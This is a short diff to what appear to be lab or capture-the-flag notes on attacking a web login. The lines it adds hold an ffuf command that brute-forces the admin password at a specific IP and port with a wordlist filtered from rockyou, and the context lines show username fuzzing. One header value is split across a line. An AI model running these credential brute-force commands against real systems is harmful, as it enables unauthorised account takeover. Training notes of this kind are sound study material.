@@ -17,3 +17,8 @@ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http:
 grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
 ```
 
+```bash
+ffuf -w ./custom_wordlist.txt -u http://94.237.57.154:37595/index.php -X POST -H "Content-Type: a  
+pplication/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password."
+```
+
